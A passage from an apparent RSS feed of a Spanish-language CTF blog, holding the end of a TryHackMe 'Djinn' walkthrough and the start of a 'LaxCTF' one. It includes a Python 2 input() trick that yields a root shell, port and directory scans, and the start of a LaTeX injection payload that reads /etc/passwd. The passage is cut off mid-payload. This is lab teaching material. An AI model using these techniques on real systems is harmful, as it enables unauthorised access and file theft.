&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;$ strings .pyc
getuser&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;
system&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;
randintc
Working on it!! &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;
/home/mzfr/scripts/exp.pyt
naughtyboi
Choose a number between &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; to 100: s
Enter your number: s
/bin/shs
Better Luck next time&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;
inputR
numt
/home/mzfr/scripts/exp.pyt
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;... REDACTED ...&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Copiamos este archivo a nuestra maquina y utilizamos &lt;a href=&#34;https://pypi.org/project/uncompyle6/&#34;&gt;&lt;strong&gt;uncompyle6&lt;/strong&gt;&lt;/a&gt;. Vemos en el codigo fuente, especificamente en la fucnion &lt;code&gt;guessit()&lt;/code&gt; vemos que hace una comparacion de la variable &lt;code&gt;s&lt;/code&gt; con &lt;code&gt;num&lt;/code&gt;, en el input no realiza ninguna validacion de si lo ingresado es un entero o string, en esta funcion al adivinar el numero devuelve una shell con usuario root. Para poder aprovecharnos de este script vamos a ingresar el nombre de la variable &lt;code&gt;num&lt;/code&gt; ya que la variable &lt;code&gt;s&lt;/code&gt; no tiene ningun tipo de validacion.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;23
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;24
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;25
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;26
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;27
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;28
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# uncompyle6 version 3.7.3&lt;/span&gt;
&lt;span class=&#34;c1&#34;&gt;# Python bytecode 2.7 (62211)&lt;/span&gt;
&lt;span class=&#34;c1&#34;&gt;# Decompiled from: Python 3.8.2 (default, Apr  1 2020, 15:52:55)&lt;/span&gt; 
&lt;span class=&#34;c1&#34;&gt;# [GCC 9.3.0]&lt;/span&gt;
&lt;span class=&#34;c1&#34;&gt;# Embedded file name: /home/mzfr/scripts/exp.py&lt;/span&gt;
&lt;span class=&#34;c1&#34;&gt;# Compiled at: 2019-11-07 07:05:18&lt;/span&gt;
from getpass import getuser
from os import system
from random import randint

def naughtyboi&lt;span class=&#34;o&#34;&gt;()&lt;/span&gt;:
    print &lt;span class=&#34;s1&#34;&gt;&amp;#39;Working on it!!&amp;#39;&lt;/span&gt;

def guessit&lt;span class=&#34;o&#34;&gt;()&lt;/span&gt;:
    &lt;span class=&#34;nv&#34;&gt;num&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; randint&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;1, 101&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
    print &lt;span class=&#34;s1&#34;&gt;&amp;#39;Choose a number between 1 to 100: &amp;#39;&lt;/span&gt;
    &lt;span class=&#34;nv&#34;&gt;s&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; input&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;Enter your number: &amp;#39;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
    &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;s&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;==&lt;/span&gt; num:
        system&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;/bin/sh&amp;#39;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
    &lt;span class=&#34;k&#34;&gt;else&lt;/span&gt;:
        print &lt;span class=&#34;s1&#34;&gt;&amp;#39;Better Luck next time&amp;#39;&lt;/span&gt;

&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;... REDACTED ...&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;

&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;__name__&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;==&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;__main__&amp;#39;&lt;/span&gt;:
    main&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;options&lt;span class=&#34;o&#34;&gt;())&lt;/span&gt;
&lt;span class=&#34;c1&#34;&gt;# okay decompiling file_pyc.pyc&lt;/span&gt;

&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Logramos obtener nuestra shell con usuario root y flag &lt;code&gt;user.txt&lt;/code&gt;.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/djinn/Screenshot_20200801_130226.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
</content:encoded>
        <dc:creator>sckull</dc:creator>
        <media:content url="https://sckull.github.io/images/posts/thm/djinn/cover.webp" medium="image"><media:title type="html">featured image</media:title></media:content>
        
        <media:content url="https://sckull.github.io/images/posts/thm/djinn/cover.webp" medium="image"><media:title type="html">meta image</media:title></media:content>
        
          
            
              <category>linux</category>
            
          
        
        
          
            
              <category>tryhackme</category>
            
          
        
        
      </item>
      
      <item>
        <title>TryHackMe - LaxCTF</title>
        <link>https://sckull.github.io/posts/laxctf/</link>
        <pubDate>Wed, 29 Jul 2020 00:00:00 +0000</pubDate>
        
        <atom:modified>Wed, 29 Jul 2020 00:00:00 +0000</atom:modified>
        <guid>https://sckull.github.io/posts/laxctf/</guid>
        <description>LaxCTF es una maquina de TryHackMe aqui encontrarás la solucion para obtener la flag user.txt y root.txt.</description>
        <content:encoded>&lt;p&gt;LaxCTF es una maquina de TryHackMe aqui encontrarás la solucion para obtener la flag user.txt y root.txt.&lt;/p&gt;




  



  &lt;div class=&#34;featured-image__wrapper&#34;&gt;
    &lt;img src=&#34;https://sckull.github.io/images/posts/thm/laxctf/cover.webp&#34; alt=&#34;featured image&#34; class=&#34;featured-image&#34; style=&#34;width: ;height: ;&#34;&gt;
  &lt;/div&gt;

&lt;h3 id=&#34;informacion-de-la-maquina&#34;&gt;Informacion de la Maquina&lt;/h3&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;Titulo&lt;/th&gt;
&lt;th&gt;LaxCTF&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;Info&lt;/td&gt;
&lt;td&gt;Try Harder!&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Puntos&lt;/td&gt;
&lt;td&gt;60&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Dificultad&lt;/td&gt;
&lt;td&gt;Media&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Maker&lt;/td&gt;
&lt;td&gt;&lt;a href=&#34;https://tryhackme.com/p/stuxnet&#34;&gt;stuxnet&lt;/a&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;h2 id=&#34;nmap&#34;&gt;NMAP&lt;/h2&gt;
&lt;p&gt;Escaneo de puertos tcp, nmap nos muestra el puerto http (80) y el puerto ssh (22) abiertos.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# Nmap 7.80 scan initiated Wed Jul 29 19:15:28 2020 as: nmap -sV -o nmap_scan_mini lax.thm&lt;/span&gt;
Nmap scan report &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; lax.thm &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;10.10.90.68&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
Host is up &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;0.27s latency&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;.
Not shown: &lt;span class=&#34;m&#34;&gt;998&lt;/span&gt; closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Ubuntu Linux&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; protocol 2.0&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
80/tcp open  http    Apache httpd 2.4.18 &lt;span class=&#34;o&#34;&gt;((&lt;/span&gt;Ubuntu&lt;span class=&#34;o&#34;&gt;))&lt;/span&gt;
Service Info: OS: Linux&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
&lt;span class=&#34;c1&#34;&gt;# Nmap done at Wed Jul 29 19:16:41 2020 -- 1 IP address (1 host up) scanned in 72.59 seconds&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h2 id=&#34;http&#34;&gt;HTTP&lt;/h2&gt;
&lt;p&gt;Encontramos una pagina web en el puerto 80.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/laxctf/Screenshot_20200729_181801.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;h2 id=&#34;rustbuster&#34;&gt;RUSTBUSTER&lt;/h2&gt;
&lt;p&gt;Utilizamos rustbuster para busqueda de directorios y archivos.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;23
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;24
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;25
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;26
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;27
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;28
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;29
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;30
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;31
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;32
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;33
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;34
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;35
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;36
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;37
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;38
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;39
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;40
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;41
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;root@upset:~/thm/lax# /opt/rustbuster/rustbuster dir -e php,html,txt -t &lt;span class=&#34;m&#34;&gt;250&lt;/span&gt; -u http://lax.thm/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
~ rustbuster v3.0.3 ~ by phra &lt;span class=&#34;p&#34;&gt;&amp;amp;&lt;/span&gt; ps1dr3x ~

         _     _                 _         _           _        _                 _         _           _           _     
        /&lt;span class=&#34;se&#34;&gt;\ \ &lt;/span&gt; /&lt;span class=&#34;se&#34;&gt;\_\ &lt;/span&gt;             / /&lt;span class=&#34;se&#34;&gt;\ &lt;/span&gt;     /&lt;span class=&#34;se&#34;&gt;\ \ &lt;/span&gt;       / /&lt;span class=&#34;se&#34;&gt;\ &lt;/span&gt;    /&lt;span class=&#34;se&#34;&gt;\_\ &lt;/span&gt;             / /&lt;span class=&#34;se&#34;&gt;\ &lt;/span&gt;     /&lt;span class=&#34;se&#34;&gt;\ \ &lt;/span&gt;       /&lt;span class=&#34;se&#34;&gt;\ \ &lt;/span&gt;       /&lt;span class=&#34;se&#34;&gt;\ \ &lt;/span&gt;  
       /  &lt;span class=&#34;se&#34;&gt;\ \/&lt;/span&gt; / /         _   / /  &lt;span class=&#34;se&#34;&gt;\ &lt;/span&gt;    &lt;span class=&#34;se&#34;&gt;\_\ \ &lt;/span&gt;     / /  &lt;span class=&#34;se&#34;&gt;\ &lt;/span&gt;  / / /         _   / /  &lt;span class=&#34;se&#34;&gt;\ &lt;/span&gt;    &lt;span class=&#34;se&#34;&gt;\_\ \ &lt;/span&gt;     /  &lt;span class=&#34;se&#34;&gt;\ \ &lt;/span&gt;     /  &lt;span class=&#34;se&#34;&gt;\ \ &lt;/span&gt; 
      / /&lt;span class=&#34;se&#34;&gt;\ \ \ \ \_&lt;/span&gt;_      /&lt;span class=&#34;se&#34;&gt;\_\/&lt;/span&gt; / /&lt;span class=&#34;se&#34;&gt;\ \_&lt;/span&gt;_  /&lt;span class=&#34;se&#34;&gt;\_&lt;/span&gt;_ &lt;span class=&#34;se&#34;&gt;\ &lt;/span&gt;   / / /&lt;span class=&#34;se&#34;&gt;\ \ &lt;/span&gt; &lt;span class=&#34;se&#34;&gt;\ \ \_&lt;/span&gt;_      /&lt;span class=&#34;se&#34;&gt;\_\/&lt;/span&gt; / /&lt;span class=&#34;se&#34;&gt;\ \_&lt;/span&gt;_  /&lt;span class=&#34;se&#34;&gt;\_&lt;/span&gt;_ &lt;span class=&#34;se&#34;&gt;\ &lt;/span&gt;   / /&lt;span class=&#34;se&#34;&gt;\ \ \ &lt;/span&gt;   / /&lt;span class=&#34;se&#34;&gt;\ \ \ &lt;/span&gt;
     / / /&lt;span class=&#34;se&#34;&gt;\ \_\ \_&lt;/span&gt;__&lt;span class=&#34;se&#34;&gt;\ &lt;/span&gt;   / / / / /&lt;span class=&#34;se&#34;&gt;\ \_&lt;/span&gt;__&lt;span class=&#34;se&#34;&gt;\/&lt;/span&gt; /_ &lt;span class=&#34;se&#34;&gt;\ \ &lt;/span&gt; / / /&lt;span class=&#34;se&#34;&gt;\ \ \ &lt;/span&gt; &lt;span class=&#34;se&#34;&gt;\ \_&lt;/span&gt;__&lt;span class=&#34;se&#34;&gt;\ &lt;/span&gt;   / / / / /&lt;span class=&#34;se&#34;&gt;\ \_&lt;/span&gt;__&lt;span class=&#34;se&#34;&gt;\/&lt;/span&gt; /_ &lt;span class=&#34;se&#34;&gt;\ \ &lt;/span&gt; / / /&lt;span class=&#34;se&#34;&gt;\ \_\ &lt;/span&gt; / / /&lt;span class=&#34;se&#34;&gt;\ \_\
&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;&lt;/span&gt;    / / /_/ / /&lt;span class=&#34;se&#34;&gt;\_&lt;/span&gt;_  /   / / /&lt;span class=&#34;se&#34;&gt;\ \ \ \/&lt;/span&gt;___/ / /&lt;span class=&#34;se&#34;&gt;\ \ \/&lt;/span&gt; / /&lt;span class=&#34;se&#34;&gt;\ \_\ \ &lt;/span&gt; &lt;span class=&#34;se&#34;&gt;\_&lt;/span&gt;_  /   / / /&lt;span class=&#34;se&#34;&gt;\ \ \ \/&lt;/span&gt;___/ / /&lt;span class=&#34;se&#34;&gt;\ \ \/&lt;/span&gt; /_/_ &lt;span class=&#34;se&#34;&gt;\/&lt;/span&gt;_/ / / /_/ / /
   / / /__&lt;span class=&#34;se&#34;&gt;\/&lt;/span&gt; / / / /   / / /  &lt;span class=&#34;se&#34;&gt;\ \ \ &lt;/span&gt;   / / /  &lt;span class=&#34;se&#34;&gt;\/&lt;/span&gt;_/ / /&lt;span class=&#34;se&#34;&gt;\ \ \_&lt;/span&gt;__&lt;span class=&#34;se&#34;&gt;\ &lt;/span&gt;/ / /   / / /  &lt;span class=&#34;se&#34;&gt;\ \ \ &lt;/span&gt;   / / /  &lt;span class=&#34;se&#34;&gt;\/&lt;/span&gt;_/ /____/&lt;span class=&#34;se&#34;&gt;\ &lt;/span&gt;  / / /__&lt;span class=&#34;se&#34;&gt;\/&lt;/span&gt; / 
  / / /_____/ / / /   / / _    &lt;span class=&#34;se&#34;&gt;\ \ \ &lt;/span&gt; / / /     / / /  &lt;span class=&#34;se&#34;&gt;\ \ \_&lt;/span&gt;_// / /   / / _    &lt;span class=&#34;se&#34;&gt;\ \ \ &lt;/span&gt; / / /     / /&lt;span class=&#34;se&#34;&gt;\_&lt;/span&gt;___&lt;span class=&#34;se&#34;&gt;\/&lt;/span&gt;  / / /_____/  
 / / /&lt;span class=&#34;se&#34;&gt;\ \ \ &lt;/span&gt; / / /___/ / /_/&lt;span class=&#34;se&#34;&gt;\_&lt;/span&gt;_/ / / / / /     / / /____&lt;span class=&#34;se&#34;&gt;\_\ \ &lt;/span&gt;/ / /___/ / /_/&lt;span class=&#34;se&#34;&gt;\_&lt;/span&gt;_/ / / / / /     / / /______ / / /&lt;span class=&#34;se&#34;&gt;\ \ \ &lt;/span&gt;   
/ / /  &lt;span class=&#34;se&#34;&gt;\ \ \/&lt;/span&gt; / /____&lt;span class=&#34;se&#34;&gt;\/&lt;/span&gt; /&lt;span class=&#34;se&#34;&gt;\ \/&lt;/span&gt;___/ / /_/ /     / / /__________/ / /____&lt;span class=&#34;se&#34;&gt;\/&lt;/span&gt; /&lt;span class=&#34;se&#34;&gt;\ \/&lt;/span&gt;___/ / /_/ /     / / /_______/ / /  &lt;span class=&#34;se&#34;&gt;\ \ \ &lt;/span&gt;  
&lt;span class=&#34;se&#34;&gt;\/&lt;/span&gt;_/    &lt;span class=&#34;se&#34;&gt;\_\/\/&lt;/span&gt;_________/  &lt;span class=&#34;se&#34;&gt;\_&lt;/span&gt;____&lt;span class=&#34;se&#34;&gt;\/&lt;/span&gt;  &lt;span class=&#34;se&#34;&gt;\_\/&lt;/span&gt;      &lt;span class=&#34;se&#34;&gt;\/&lt;/span&gt;_____________&lt;span class=&#34;se&#34;&gt;\/&lt;/span&gt;_________/  &lt;span class=&#34;se&#34;&gt;\_&lt;/span&gt;____&lt;span class=&#34;se&#34;&gt;\/&lt;/span&gt;  &lt;span class=&#34;se&#34;&gt;\_\/&lt;/span&gt;      &lt;span class=&#34;se&#34;&gt;\/&lt;/span&gt;__________&lt;span class=&#34;se&#34;&gt;\/&lt;/span&gt;_/    &lt;span class=&#34;se&#34;&gt;\_\/&lt;/span&gt;   


&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;?&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Started at	: 2020-07-29 20:57:11

GET	&lt;span class=&#34;m&#34;&gt;200&lt;/span&gt; OK				http://lax.thm/
GET     &lt;span class=&#34;m&#34;&gt;403&lt;/span&gt; Forbidden                   http://lax.thm/.html
GET     &lt;span class=&#34;m&#34;&gt;403&lt;/span&gt; Forbidden                   http://lax.thm/.php
GET     &lt;span class=&#34;m&#34;&gt;200&lt;/span&gt; OK                          http://lax.thm/index.php
GET     &lt;span class=&#34;m&#34;&gt;301&lt;/span&gt; Moved Permanently           http://lax.thm/pdf
						&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;gt; http://lax.thm/pdf/
GET     &lt;span class=&#34;m&#34;&gt;301&lt;/span&gt; Moved Permanently           http://lax.thm/templates
						&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;gt; http://lax.thm/templates/
GET     &lt;span class=&#34;m&#34;&gt;301&lt;/span&gt; Moved Permanently           http://lax.thm/assets
						&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;gt; http://lax.thm/assets/
GET     &lt;span class=&#34;m&#34;&gt;200&lt;/span&gt; OK                          http://lax.thm/ajax.php
GET     &lt;span class=&#34;m&#34;&gt;301&lt;/span&gt; Moved Permanently           http://lax.thm/javascript
						&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;gt; http://lax.thm/javascript/
GET     &lt;span class=&#34;m&#34;&gt;200&lt;/span&gt; OK                          http://lax.thm/config.php
GET     &lt;span class=&#34;m&#34;&gt;200&lt;/span&gt; OK                          http://lax.thm/flag.php
GET     &lt;span class=&#34;m&#34;&gt;301&lt;/span&gt; Moved Permanently           http://lax.thm/compile
						&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;gt; http://lax.thm/compile/
GET     &lt;span class=&#34;m&#34;&gt;301&lt;/span&gt; Moved Permanently           http://lax.thm/Google-Earth
						&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;gt; http://lax.thm/Google-Earth/
GET     &lt;span class=&#34;m&#34;&gt;200&lt;/span&gt; OK                          http://lax.thm/
GET     &lt;span class=&#34;m&#34;&gt;403&lt;/span&gt; Forbidden                   http://lax.thm/.php
GET     &lt;span class=&#34;m&#34;&gt;403&lt;/span&gt; Forbidden                   http://lax.thm/.html
C^
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h2 id=&#34;latex---exploit&#34;&gt;LaTeX - EXPLOIT&lt;/h2&gt;
&lt;p&gt;En la pagina encontramos &lt;code&gt;pdfTeX&lt;/code&gt; para generar PDF a partir de un template y texto ingresado, ingresamos un texto cualquiera y nos devuelve la direccion en donde se encuentra el PDF. Además la version de &lt;code&gt;pdfTeX Version 3.14159265-2.6-1.40.16&lt;/code&gt;&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/laxctf/Screenshot_20200729_182529.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;En la direccion, el PDF con el texto ingresado.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/laxctf/Screenshot_20200729_182627.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Con el siguiente &amp;ldquo;payload&amp;rdquo; logramos obtener la primera linea del archivo &lt;code&gt;/etc/passwd&lt;/code&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;se&#34;&gt;\n&lt;/span&gt;ewread&lt;span class=&#34;se&#34;&gt;\f&lt;/span&gt;ile
